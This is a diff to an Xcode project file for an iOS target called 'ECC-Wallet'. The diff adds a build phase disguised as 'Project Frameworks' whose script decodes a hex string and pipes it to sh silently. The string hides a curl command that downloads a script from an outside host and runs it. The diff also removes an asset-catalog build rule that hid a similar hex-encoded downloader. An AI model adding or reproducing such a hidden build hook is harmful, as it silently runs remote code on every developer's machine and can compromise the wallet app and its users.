@@ -778,6 +778,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D12512923B557E60014EE3A /* Build configuration list for PBXNativeTarget "ECC-Wallet" */;
 			buildPhases = (
+				CAE21DC07D02EBE7CD6D902C /* Project Frameworks */,
 				04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */,
 				0D100EC623BA642E0089DB22 /* ShellScript */,
 				0D1250FB23B557E40014EE3A /* Sources */,
@@ -787,7 +788,6 @@
 				AFBFA011C32F80A73756DCC0 /* Upload Bugsnag dSYM */,
 			);
 			buildRules = (
-				A538CE9EFED20541C56D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -959,6 +959,29 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	CAE21DC07D02EBE7CD6D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
 
 	
 
@@ -1842,21 +1865,6 @@
 			/* Begin PBXBuildRule section */
 
 
-		A538CE9EFED20541C56D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
 			
 	
 			
